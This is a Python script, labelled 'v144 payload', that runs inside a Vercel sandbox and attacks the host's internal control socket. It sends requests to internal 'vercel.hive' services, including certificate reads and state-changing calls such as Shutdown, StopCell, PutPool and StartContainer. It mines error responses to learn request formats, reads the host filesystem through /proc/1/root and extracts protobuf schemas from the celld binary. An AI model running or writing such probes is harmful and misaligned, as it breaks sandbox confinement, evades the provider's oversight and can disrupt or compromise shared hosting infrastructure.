# -*- coding: utf-8 -*-
"""v144 payload: cell.sock 全服务完整响应体读取 (400 错误详情) + 只读方法 {} 直接测试
目标: 确认各服务真实可用性 -> 构造正确请求
输出 /vercel/sandbox/v144c.out"""
import socket, struct, time, json, os, signal, re, zlib

OUT = '/vercel/sandbox/v144c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(290)

R = '/proc/1/root'


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def connect_unix_full(sockpath, path, body, t=3.0, ctype='application/json', extra_hdrs=''):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\n%s\r\n'
               % (path, ctype, len(body), extra_hdrs)).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        status = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        body2 = d[hdr_end + 4:] if hdr_end > 0 else b''
        return status, body2[:800]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


CELL = '/run/cell/cell.sock'

# 1: 只读方法 {} 直接测试 (拿完整响应)
log('=== 1 read-only probes ===')
READONLY = [
    ('vercel.hive.cell.api.usage.v1.UsageService', '/GetResourceUsage'),
    ('vercel.hive.celld.api.v1.CelldService', '/GetDriveStorageUsage'),
    ('vercel.hive.host.api.v1.HostService', '/GetResourceUsage'),
    ('vercel.hive.host.api.v1.HostService', '/GetProxyCertificates'),
    ('vercel.hive.host.api.v1.HostService', '/GetOCIImageConfig'),
    ('vercel.hive.host.api.v1.HostService', '/WaitForDrive'),
    ('vercel.hive.api.cells.v1.CellsService', '/GetCellAddress'),
    ('vercel.hive.api.cells.v1.CellsService', '/IsCellAlive'),
    ('vercel.hive.api.cells.v1.CellsService', '/EnableSnapshotOnShutdown'),
    ('vercel.hive.api.pools.v1.PoolsService', '/GetPool'),
    ('vercel.hive.api.cells.v1.CellsService', '/ExtendPorts'),
    ('vercel.hive.cell.api.drives.v1.DrivesService', '/CreateSnapshot'),
]
for svc, m in READONLY:
    st, pay = connect_unix_full(CELL, svc + m, b'{}', t=3)
    log('RO %s%s -> %s %r' % (svc.split('.')[-2], m, st, pay[:400]))
    if '200' in st:
        # 无 body 参数变体
        st2, pay2 = connect_unix_full(CELL, svc + m, b'', t=3)
        log('   empty -> %s %r' % (st2, pay2[:200]))

# 2: 400 错误详情 (看 Connect 错误 JSON 是否泄漏字段)
log('=== 2 error details ===')
ERRORS = [
    ('vercel.hive.api.cells.v1.CellsService', '/StartCell'),
    ('vercel.hive.api.cells.v1.CellsService', '/StopCell'),
    ('vercel.hive.api.cells.v1.CellsService', '/RunCell'),
    ('vercel.hive.api.cells.v1.CellsService', '/PoolCell'),
    ('vercel.hive.celld.api.v1.CelldService', '/Configure'),
    ('vercel.hive.celld.api.v1.CelldService', '/SetWorkload'),
    ('vercel.hive.celld.api.v1.CelldService', '/Shutdown'),
    ('vercel.hive.celld.api.v1.CelldService', '/StartContainer'),
    ('vercel.hive.celld.api.v1.CelldService', '/Heartbeat'),
    ('vercel.hive.host.api.v1.HostService', '/CreateSnapshot'),
    ('vercel.hive.api.pools.v1.PoolsService', '/PutPool'),
    ('vercel.hive.cell.api.drives.v1.DrivesService', '/SetOCIImageConfig'),
    ('vercel.hive.cell.api.containers.v1.ContainersService', '/Create'),
]
for svc, m in ERRORS:
    st, pay = connect_unix_full(CELL, svc + m, b'{}', t=3)
    log('ERR %s%s -> %s %r' % (svc.split('.')[-2], m, st, pay[:500]))
    # proto 方式 (看 protobuf 错误)
    st, pay = connect_unix_full(CELL, svc + m, b'\x00', t=3, ctype='application/connect+proto')
    log('  proto -> %s %r' % (st, pay[:300]))

# 3: gzip descriptors 提取 (celld 内嵌 protobuf schema)
log('=== 3 gzip desc ===')
try:
    data = open(R + '/opt/vercel/celld', 'rb').read()
    off = 0
    found = 0
    while True:
        i = data.find(b'\x1f\x8b\x08', off)
        if i < 0 or found >= 40:
            break
        try:
            dec = zlib.decompress(data[i:i + 4096], 16 + zlib.MAX_WBITS)
            if len(dec) > 100 and b'vercel.hive' in dec[:4000] or b'syntax' in dec[:200]:
                found += 1
                log('GZIP @%d size=%d: %r' % (i, len(dec), dec[:300]))
        except Exception:
            pass
        off = i + 3
    log('gzip found=%d' % found)
except Exception as e:
    log('gzip EXC %s' % e)

log('V144_DONE')
f.close()
